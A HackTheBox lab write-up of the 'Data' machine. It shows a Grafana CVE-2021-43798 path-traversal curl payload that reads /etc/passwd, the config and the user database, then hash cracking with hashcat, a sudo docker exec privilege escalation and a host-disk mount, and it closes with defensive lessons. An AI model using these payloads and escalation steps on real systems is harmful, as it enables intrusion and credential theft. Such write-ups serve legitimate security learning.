# Data — HTB Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Network / Web

---

## TL;DR

Grafana 8.0.0 is exposed on port 3000, vulnerable to **CVE-2021-43798** (unauthenticated path traversal). Leveraged it to read the Grafana SQLite database, extracted a PBKDF2-SHA256 hash for user `boris`, cracked it with hashcat (`beautiful1`), and SSH'd in for user. Privesc via `sudo docker exec *` — retrieved the container ID from `/proc`, dropped into the Grafana container as root, then mounted the host disk `/dev/sda1` to read the root flag.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `curl` | Exploiting CVE-2021-43798 path traversal |
| `sqlite3` | Extracting credentials from Grafana DB |
| `hashcat` | Cracking PBKDF2-SHA256 hash (mode 10900) |
| `ssh` | Remote access as `boris` |
| `docker exec` | Container escape via sudo misconfiguration |

---

## Recon

Added the target to `/etc/hosts`:

```bash
echo "10.129.1.70 data.htb" | sudo tee -a /etc/hosts
```

### Nmap Quick Scan

```bash
nmap -sV -sC -T4 data.htb
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
3000/tcp open  http    Grafana
```

### Nmap Full Scan

```bash
nmap -p- --min-rate 5000 data.htb
```

Only ports **22** and **3000** open. No hidden services.

---

## Enumeration

Fingerprinted the web service on port 3000:

```bash
whatweb http://data.htb:3000
```

```
Grafana [8.0.0]
```

Grafana 8.0.0 is running and the login page is exposed at `http://data.htb:3000/login`.

> **Grafana < 8.3.0** is vulnerable to **CVE-2021-43798** — an unauthenticated path traversal allowing arbitrary file read via the plugin endpoint.

---

## Exploitation

### CVE-2021-43798 — Grafana Path Traversal

Confirmed the vulnerability by reading `/etc/passwd`:

```bash
curl --path-as-is \
  "http://data.htb:3000/public/plugins/alertlist/../../../../../../../../../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/ash
...
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```

The `/bin/ash` shell confirms this is an **Alpine Linux Docker container**.

### Retrieve Grafana Config

```bash
curl --path-as-is \
  "http://data.htb:3000/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini" \
  -o grafana.ini

grep -E "password|secret|admin" grafana.ini
```

Key findings:

```ini
admin_user = admin
admin_password = admin
secret_key = SW2YcwTIb9zpOOhoPsMm
```

### Retrieve Grafana Database

```bash
curl --path-as-is \
  "http://data.htb:3000/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/grafana.db" \
  -o grafana.db
```

### Extract Credentials

```bash
sqlite3 grafana.db "SELECT login,email,password,salt FROM user;"
```

```
admin|admin@localhost|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S
boris|boris@data.vl|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl
```

### Crack the Hash

Grafana uses **PBKDF2-HMAC-SHA256** (10,000 iterations, 50-byte key). Convert to hashcat format:

```python
import binascii, base64

users = {
    'admin': ('7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8', 'YObSoLj55S'),
    'boris': ('dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8', 'LCBhdtJWjl'),
}
for user, (hexhash, salt) in users.items():
    b64hash = base64.b64encode(binascii.unhexlify(hexhash)).decode()
    b64salt = base64.b64encode(salt.encode()).decode()
    print(f"sha256:10000:{b64salt}:{b64hash}")
```

```bash
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002v... : beautiful1
```

**Credentials:** `boris:beautiful1`

---

## Post-Exploitation

### User Flag

```bash
ssh boris@data.htb  # password: beautiful1
cat ~/user.txt
```

```
6a2669be5c0bf73ad76f08f2e3d3610e
```

### Privilege Escalation — Docker Exec Misconfiguration

Checked sudo permissions:

```bash
sudo -l
```

```
(root) NOPASSWD: /snap/bin/docker exec *
```

`docker ps` is not in sudoers so we can't list containers directly. Extracted the container ID from `/proc` instead:

```bash
cat /proc/$(pgrep grafana-server)/cgroup | grep docker
```

```
12:devices:/docker/e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
```

Dropped into the container as root:

```bash
sudo /snap/bin/docker exec -u root -it \
  e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 \
  /bin/sh
```

```
/usr/share/grafana # whoami
root
```

### Docker Escape — Mount Host Disk

No bind mounts to the host filesystem, but `/dev/sda1` (the host's physical disk) is accessible from within the container. Mounted it directly:

```sh
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

### Root Flag

```sh
cat /mnt/host/root/root.txt
```

```
918bf0ea46869282cae6266f96ded254
```

---

## Lessons Learned

- **CVE-2021-43798** is a critical unauthenticated file read — always keep Grafana updated and never expose the dashboard publicly. The SQLite DB and `grafana.ini` both contain sensitive credentials that enable full compromise.
- **PBKDF2 doesn't mean uncrackable** — weak passwords like `beautiful1` fall to rockyou regardless of the hashing algorithm. Strong, unique passwords matter more than the hash function.
- **`docker exec *` in sudoers is dangerous** — even without `docker ps`, a container ID is trivially recoverable from `/proc/<pid>/cgroup` of any containerized process visible on the host.
- **Raw block device access bypasses namespacing** — being root in a container with access to `/dev/sda1` allows a full disk mount, completely circumventing filesystem isolation. This is a critical host misconfiguration with no easy container-level fix.

---

*k41r0s3*
